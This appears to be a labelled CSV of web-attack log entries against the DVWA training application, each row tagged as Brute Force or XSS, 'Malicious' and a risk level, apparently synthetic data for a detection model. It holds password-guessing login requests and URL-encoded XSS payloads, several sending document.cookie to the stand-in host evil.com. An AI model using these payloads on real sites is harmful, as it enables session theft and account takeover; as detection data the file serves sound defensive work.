timestamp,ip,method,url,status,user_agent,attack_type,prediction,risk_level
04/Jul/2026:18:41:21 +0530,192.168.1.151,POST,/dvwa/login.php?username=admin&password=password&Login=Login,302,sqlmap/1.7.2#stable (http://sqlmap.org),Brute Force,Malicious,High
04/Jul/2026:18:41:21 +0530,192.168.1.151,POST,/dvwa/login.php?username=admin&password=dvwa123&Login=Login,302,sqlmap/1.7.2#stable (http://sqlmap.org),Brute Force,Malicious,High
04/Jul/2026:18:41:20 +0530,192.168.1.151,POST,/dvwa/login.php?username=admin&password=qwerty&Login=Login,302,sqlmap/1.7.2#stable (http://sqlmap.org),Brute Force,Malicious,High
04/Jul/2026:18:41:19 +0530,10.0.0.44,POST,/dvwa/login.php?username=root&password=iloveyou&Login=Login,200,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:19 +0530,10.0.0.44,POST,/dvwa/login.php?username=root&password=iloveyou&Login=Login,401,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:18 +0530,10.0.0.44,POST,/dvwa/login.php?username=root&password=password&Login=Login,302,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:18 +0530,10.0.0.44,POST,/dvwa/login.php?username=root&password=toor&Login=Login,302,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:18 +0530,10.0.0.44,POST,/dvwa/login.php?username=root&password=iloveyou&Login=Login,302,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:17 +0530,10.0.0.44,POST,/dvwa/login.php?username=root&password=qwerty&Login=Login,401,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:17 +0530,10.0.0.44,POST,/dvwa/login.php?username=root&password=123456&Login=Login,302,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:16 +0530,10.0.0.44,POST,/dvwa/login.php?username=root&password=123456&Login=Login,401,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:16 +0530,10.0.0.44,POST,/dvwa/login.php?username=root&password=qwerty&Login=Login,200,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:15 +0530,192.168.1.154,POST,/dvwa/login.php?username=administrator&password=dvwa123&Login=Login,401,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:15 +0530,192.168.1.154,POST,/dvwa/login.php?username=administrator&password=letmein&Login=Login,401,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:15 +0530,10.0.0.44,POST,/dvwa/login.php?username=root&password=password&Login=Login,200,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:14 +0530,192.168.1.154,POST,/dvwa/login.php?username=administrator&password=letmein&Login=Login,302,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:14 +0530,192.168.1.154,POST,/dvwa/login.php?username=administrator&password=admin123&Login=Login,401,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:13 +0530,192.168.1.154,POST,/dvwa/login.php?username=administrator&password=password&Login=Login,302,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:12 +0530,192.168.1.154,POST,/dvwa/login.php?username=administrator&password=dvwa123&Login=Login,302,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:12 +0530,192.168.1.154,POST,/dvwa/login.php?username=administrator&password=P@ssw0rd&Login=Login,401,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:11 +0530,192.168.1.154,POST,/dvwa/login.php?username=administrator&password=letmein&Login=Login,200,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:10 +0530,192.168.1.163,POST,/dvwa/login.php?username=administrator&password=password&Login=Login,200,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:10 +0530,192.168.1.163,POST,/dvwa/login.php?username=administrator&password=welcome1&Login=Login,401,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:09 +0530,192.168.1.163,POST,/dvwa/login.php?username=administrator&password=toor&Login=Login,302,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:08 +0530,192.168.1.163,POST,/dvwa/login.php?username=administrator&password=qwerty&Login=Login,200,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:08 +0530,192.168.1.163,POST,/dvwa/login.php?username=administrator&password=123456&Login=Login,200,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:07 +0530,192.168.1.163,POST,/dvwa/login.php?username=administrator&password=password&Login=Login,200,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:07 +0530,192.168.1.163,POST,/dvwa/login.php?username=administrator&password=welcome1&Login=Login,200,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:07 +0530,192.168.1.163,POST,/dvwa/login.php?username=administrator&password=admin123&Login=Login,302,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:06 +0530,192.168.1.163,POST,/dvwa/login.php?username=administrator&password=dvwa123&Login=Login,200,Hydra/9.4,Brute Force,Malicious,High
04/Jul/2026:18:41:05 +0530,192.168.1.161,POST,/dvwa/login.php?username=test&password=iloveyou&Login=Login,302,sqlmap/1.7.2#stable (http://sqlmap.org),Brute Force,Malicious,High
04/Jul/2026:18:41:05 +0530,192.168.1.161,POST,/dvwa/login.php?username=test&password=qwerty&Login=Login,200,sqlmap/1.7.2#stable (http://sqlmap.org),Brute Force,Malicious,High
04/Jul/2026:18:41:04 +0530,192.168.1.161,POST,/dvwa/login.php?username=test&password=dvwa123&Login=Login,200,sqlmap/1.7.2#stable (http://sqlmap.org),Brute Force,Malicious,High
04/Jul/2026:18:41:04 +0530,192.168.1.161,POST,/dvwa/login.php?username=test&password=toor&Login=Login,200,sqlmap/1.7.2#stable (http://sqlmap.org),Brute Force,Malicious,High
04/Jul/2026:18:41:03 +0530,192.168.1.161,POST,/dvwa/login.php?username=test&password=dvwa123&Login=Login,200,sqlmap/1.7.2#stable (http://sqlmap.org),Brute Force,Malicious,High
04/Jul/2026:18:41:02 +0530,192.168.1.161,POST,/dvwa/login.php?username=test&password=iloveyou&Login=Login,200,sqlmap/1.7.2#stable (http://sqlmap.org),Brute Force,Malicious,High
04/Jul/2026:18:41:02 +0530,192.168.1.161,POST,/dvwa/login.php?username=test&password=iloveyou&Login=Login,401,sqlmap/1.7.2#stable (http://sqlmap.org),Brute Force,Malicious,High
04/Jul/2026:18:41:01 +0530,192.168.1.161,POST,/dvwa/login.php?username=test&password=qwerty&Login=Login,302,sqlmap/1.7.2#stable (http://sqlmap.org),Brute Force,Malicious,High
04/Jul/2026:18:41:01 +0530,192.168.1.161,POST,/dvwa/login.php?username=test&password=iloveyou&Login=Login,200,sqlmap/1.7.2#stable (http://sqlmap.org),Brute Force,Malicious,High
04/Jul/2026:18:41:01 +0530,192.168.1.161,POST,/dvwa/login.php?username=test&password=dvwa123&Login=Login,401,sqlmap/1.7.2#stable (http://sqlmap.org),Brute Force,Malicious,High
04/Jul/2026:18:41:00 +0530,192.168.1.161,POST,/dvwa/login.php?username=test&password=letmein&Login=Login,200,sqlmap/1.7.2#stable (http://sqlmap.org),Brute Force,Malicious,High
04/Jul/2026:18:41:00 +0530,192.168.1.161,POST,/dvwa/login.php?username=test&password=letmein&Login=Login,302,sqlmap/1.7.2#stable (http://sqlmap.org),Brute Force,Malicious,High
04/Jul/2026:18:40:59 +0530,192.168.1.161,POST,/dvwa/login.php?username=test&password=qwerty&Login=Login,302,sqlmap/1.7.2#stable (http://sqlmap.org),Brute Force,Malicious,Medium
04/Jul/2026:18:40:59 +0530,192.168.1.161,POST,/dvwa/login.php?username=test&password=letmein&Login=Login,401,sqlmap/1.7.2#stable (http://sqlmap.org),Brute Force,Malicious,Medium
04/Jul/2026:18:40:58 +0530,192.168.1.161,POST,/dvwa/login.php?username=test&password=admin123&Login=Login,302,sqlmap/1.7.2#stable (http://sqlmap.org),Brute Force,Malicious,Medium
04/Jul/2026:18:40:58 +0530,192.168.1.152,POST,/dvwa/login.php?username=test&password=iloveyou&Login=Login,200,python-requests/2.31.0,Brute Force,Malicious,High
04/Jul/2026:18:40:57 +0530,192.168.1.152,POST,/dvwa/login.php?username=test&password=toor&Login=Login,200,python-requests/2.31.0,Brute Force,Malicious,High
04/Jul/2026:18:40:57 +0530,192.168.1.152,POST,/dvwa/login.php?username=test&password=P@ssw0rd&Login=Login,200,python-requests/2.31.0,Brute Force,Malicious,High
04/Jul/2026:18:40:56 +0530,192.168.1.152,POST,/dvwa/login.php?username=test&password=letmein&Login=Login,401,python-requests/2.31.0,Brute Force,Malicious,High
04/Jul/2026:18:40:55 +0530,192.168.1.152,POST,/dvwa/login.php?username=test&password=welcome1&Login=Login,401,python-requests/2.31.0,Brute Force,Malicious,High
04/Jul/2026:18:40:55 +0530,192.168.1.152,POST,/dvwa/login.php?username=test&password=welcome1&Login=Login,200,python-requests/2.31.0,Brute Force,Malicious,High
04/Jul/2026:18:40:55 +0530,192.168.1.152,POST,/dvwa/login.php?username=test&password=dvwa123&Login=Login,401,python-requests/2.31.0,Brute Force,Malicious,High
04/Jul/2026:18:40:54 +0530,172.16.5.9,POST,/dvwa/login.php?username=test&password=admin123&Login=Login,401,curl/8.1.2,Brute Force,Malicious,High
04/Jul/2026:18:40:54 +0530,192.168.1.152,POST,/dvwa/login.php?username=test&password=toor&Login=Login,401,python-requests/2.31.0,Brute Force,Malicious,High
04/Jul/2026:18:40:53 +0530,172.16.5.9,POST,/dvwa/login.php?username=test&password=password&Login=Login,200,curl/8.1.2,Brute Force,Malicious,High
04/Jul/2026:18:40:52 +0530,172.16.5.9,POST,/dvwa/login.php?username=test&password=welcome1&Login=Login,302,curl/8.1.2,Brute Force,Malicious,High
04/Jul/2026:18:40:52 +0530,172.16.5.9,POST,/dvwa/login.php?username=test&password=letmein&Login=Login,302,curl/8.1.2,Brute Force,Malicious,High
04/Jul/2026:18:40:51 +0530,172.16.5.9,POST,/dvwa/login.php?username=test&password=qwerty&Login=Login,302,curl/8.1.2,Brute Force,Malicious,High
04/Jul/2026:18:40:51 +0530,172.16.5.9,POST,/dvwa/login.php?username=test&password=dvwa123&Login=Login,302,curl/8.1.2,Brute Force,Malicious,High
04/Jul/2026:18:40:50 +0530,172.16.5.9,POST,/dvwa/login.php?username=test&password=P@ssw0rd&Login=Login,302,curl/8.1.2,Brute Force,Malicious,High
04/Jul/2026:18:40:50 +0530,172.16.5.9,POST,/dvwa/login.php?username=test&password=qwerty&Login=Login,200,curl/8.1.2,Brute Force,Malicious,High
04/Jul/2026:18:40:49 +0530,172.16.5.9,POST,/dvwa/login.php?username=test&password=admin123&Login=Login,200,curl/8.1.2,Brute Force,Malicious,High
04/Jul/2026:18:40:49 +0530,172.16.5.9,POST,/dvwa/login.php?username=test&password=123456&Login=Login,401,curl/8.1.2,Brute Force,Malicious,High
04/Jul/2026:18:40:48 +0530,192.168.1.151,GET,/dvwa/vulnerabilities/xss_s/?name=%3Csvg%20onload%3Dalert%281%29%3E,500,python-requests/2.31.0,XSS,Malicious,Medium
04/Jul/2026:18:40:46 +0530,10.0.0.44,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:40:44 +0530,192.168.1.153,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,200,python-requests/2.31.0,XSS,Malicious,Medium
04/Jul/2026:18:40:42 +0530,192.168.1.158,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,500,sqlmap/1.7.2#stable (http://sqlmap.org),XSS,Malicious,Medium
04/Jul/2026:18:40:38 +0530,192.168.1.160,GET,/dvwa/vulnerabilities/xss_s/?name=%3Csvg%20onload%3Dalert%281%29%3E,403,Hydra/9.4,XSS,Malicious,Medium
04/Jul/2026:18:40:36 +0530,192.168.1.152,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:40:32 +0530,192.168.1.163,GET,/dvwa/vulnerabilities/xss_s/?name=%3Csvg%20onload%3Dalert%281%29%3E,200,python-requests/2.31.0,XSS,Malicious,Medium
04/Jul/2026:18:40:29 +0530,192.168.1.158,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,curl/8.1.2,XSS,Malicious,Medium
04/Jul/2026:18:40:27 +0530,192.168.1.158,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,XSS,Malicious,Medium
04/Jul/2026:18:40:25 +0530,192.168.1.158,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,XSS,Malicious,Medium
04/Jul/2026:18:40:20 +0530,192.168.1.161,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:40:16 +0530,192.168.1.156,GET,/dvwa/vulnerabilities/xss_r/?name=%3Csvg%20onload%3Dalert%281%29%3E,500,python-requests/2.31.0,XSS,Malicious,Medium
04/Jul/2026:18:40:15 +0530,172.16.5.9,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,curl/8.1.2,XSS,Malicious,Medium
04/Jul/2026:18:40:09 +0530,172.16.5.9,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,XSS,Malicious,Medium
04/Jul/2026:18:40:04 +0530,192.168.1.163,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,200,sqlmap/1.7.2#stable (http://sqlmap.org),XSS,Malicious,Medium
04/Jul/2026:18:40:01 +0530,192.168.1.151,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,403,Hydra/9.4,XSS,Malicious,Medium
04/Jul/2026:18:39:56 +0530,192.168.1.154,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,curl/8.1.2,XSS,Malicious,Medium
04/Jul/2026:18:39:55 +0530,192.168.1.155,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,403,python-requests/2.31.0,XSS,Malicious,Medium
04/Jul/2026:18:39:53 +0530,172.16.5.9,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,500,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,XSS,Malicious,Medium
04/Jul/2026:18:39:46 +0530,192.168.1.153,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,200,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:39:43 +0530,192.168.1.155,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,403,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,XSS,Malicious,Medium
04/Jul/2026:18:39:41 +0530,10.0.0.44,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,403,curl/8.1.2,XSS,Malicious,Medium
04/Jul/2026:18:39:33 +0530,192.168.1.161,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,200,sqlmap/1.7.2#stable (http://sqlmap.org),XSS,Malicious,Medium
04/Jul/2026:18:39:25 +0530,192.168.1.152,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,XSS,Malicious,Medium
04/Jul/2026:18:39:18 +0530,192.168.1.157,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,XSS,Malicious,Medium
04/Jul/2026:18:39:16 +0530,192.168.1.163,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,500,python-requests/2.31.0,XSS,Malicious,Medium
04/Jul/2026:18:39:10 +0530,10.0.0.13,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,200,python-requests/2.31.0,XSS,Malicious,Medium
04/Jul/2026:18:39:04 +0530,192.168.1.154,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,XSS,Malicious,Medium
04/Jul/2026:18:39:02 +0530,192.168.1.156,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,403,curl/8.1.2,XSS,Malicious,Medium
04/Jul/2026:18:38:58 +0530,192.168.1.154,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,XSS,Malicious,Medium
04/Jul/2026:18:38:55 +0530,192.168.1.154,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,403,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:38:53 +0530,192.168.1.152,GET,/dvwa/vulnerabilities/xss_r/?name=%3Csvg%20onload%3Dalert%281%29%3E,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:38:46 +0530,192.168.1.160,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,403,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,XSS,Malicious,Medium
04/Jul/2026:18:38:39 +0530,10.0.0.13,GET,/dvwa/vulnerabilities/xss_r/?name=%3Csvg%20onload%3Dalert%281%29%3E,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,XSS,Malicious,Medium
04/Jul/2026:18:38:36 +0530,192.168.1.151,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,500,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:38:29 +0530,192.168.1.158,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,XSS,Malicious,Medium
04/Jul/2026:18:38:27 +0530,192.168.1.154,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,403,sqlmap/1.7.2#stable (http://sqlmap.org),XSS,Malicious,Medium
04/Jul/2026:18:38:22 +0530,192.168.1.157,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,500,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,XSS,Malicious,Medium
04/Jul/2026:18:38:17 +0530,192.168.1.153,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,403,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,XSS,Malicious,Medium
04/Jul/2026:18:38:13 +0530,192.168.1.162,GET,/dvwa/vulnerabilities/xss_s/?name=%3Csvg%20onload%3Dalert%281%29%3E,500,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,XSS,Malicious,Medium
04/Jul/2026:18:38:09 +0530,192.168.1.160,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,403,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,XSS,Malicious,Medium
04/Jul/2026:18:38:06 +0530,192.168.1.160,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,curl/8.1.2,XSS,Malicious,Medium
